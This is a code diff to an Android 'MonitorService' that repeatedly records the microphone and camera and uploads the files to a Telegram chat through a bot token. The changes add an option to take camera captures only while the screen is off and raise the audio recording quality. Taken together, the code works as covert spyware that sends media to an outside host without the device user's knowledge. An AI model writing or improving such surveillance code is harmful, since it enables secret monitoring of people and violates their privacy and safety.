@@ -48,6 +48,7 @@ class MonitorService : Service(), LifecycleOwner {
     private var audioDuration: Long = 60000L
     private var audioScreenOff: Boolean = false
     private var sendCamera: Boolean = false
+    private var cameraScreenOff: Boolean = false
     private var captureInterval: Long = 10000L 
 
     private var mediaRecorder: android.media.MediaRecorder? = null
@@ -78,14 +79,14 @@ class MonitorService : Service(), LifecycleOwner {
         sendCamera = pref.getBoolean("sendCamera", false)
         sendAudio = pref.getBoolean("sendAudio", false)
         
-        // Reusing screenshot interval for general capture loop
-        val sec = pref.getLong("screenshotInterval", 10L) 
-        captureInterval = sec * 1000L
+        val camSec = pref.getLong("cameraInterval", 10L) 
+        captureInterval = camSec * 1000L
         if (captureInterval < 5000L) captureInterval = 5000L
         
         audioDuration = pref.getLong("audioDuration", 60L) * 1000L
         if (audioDuration < 5000L) audioDuration = 5000L
         audioScreenOff = pref.getBoolean("audioScreenOff", false)
+        cameraScreenOff = pref.getBoolean("cameraScreenOff", false)
     }
     
     private fun startLoops() {
@@ -113,7 +114,10 @@ class MonitorService : Service(), LifecycleOwner {
                  while (isActive) {
                      loadCredentials()
                      if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendCamera) {
-                         captureCameraAndSend()
+                         val shouldCapture = if (cameraScreenOff) !isScreenOn() else true
+                         if (shouldCapture) {
+                             captureCameraAndSend()
+                         }
                      }
                      delay(captureInterval)
                  }
@@ -135,8 +139,10 @@ class MonitorService : Service(), LifecycleOwner {
         // Ensure Mic is free
         delay(1000)
 
-        // Use .3gp for max compatibility matching the working test
-        val audioFile = java.io.File(cacheDir, "audio_${System.currentTimeMillis()}.3gp")
+        // Use .m4a for high quality AAC
+        val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault())
+        val timestamp = dateFormat.format(java.util.Date())
+        val audioFile = java.io.File(cacheDir, "audio_$timestamp.m4a")
         
         // Local variable for thread safety within this suspension
         var mr: android.media.MediaRecorder? = null
@@ -150,9 +156,11 @@ class MonitorService : Service(), LifecycleOwner {
             
             mr.apply {
                 setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                // Use robust legacy formats that are guaranteed to work
-                setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
-                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
+                // Switch to High Quality AAC
+                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                setAudioEncodingBitRate(128000) // 128 kbps
+                setAudioSamplingRate(44100)     // 44.1 kHz
                 setOutputFile(audioFile.absolutePath)
                 prepare()
                 start()
@@ -237,7 +245,7 @@ class MonitorService : Service(), LifecycleOwner {
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", chatId)
                 .addFormDataPart("audio", file.name,
-                    file.readBytes().toRequestBody("audio/3gpp".toMediaTypeOrNull(), 0, file.length().toInt()))
+                    file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
                 .build()
             val request = Request.Builder().url(url).post(requestBody).build()
             client.newCall(request).execute().use { response ->
